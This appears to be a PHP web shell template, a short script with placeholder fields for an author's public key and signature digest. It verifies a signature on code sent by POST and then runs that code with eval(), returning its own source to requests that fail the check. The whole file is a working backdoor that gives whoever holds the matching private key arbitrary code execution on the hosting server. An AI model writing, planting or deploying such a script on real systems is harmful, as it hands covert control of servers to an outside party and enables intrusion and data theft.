<?php

$k = <<<K
((author_pub))
K;

if (!isset($_POST['p']) || (!$p = $_POST['p']) || !isset($_POST['s']) || (1 !== openssl_verify($p, base64_decode($_POST['s']), $k, ((signature_digest))))) {
  header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request');
  header('Content-Type: text/plain');
  readfile(__FILE__);
  exit;
}

if ($p[0] == '<')
  $p = '?>' . $p;

eval($p);
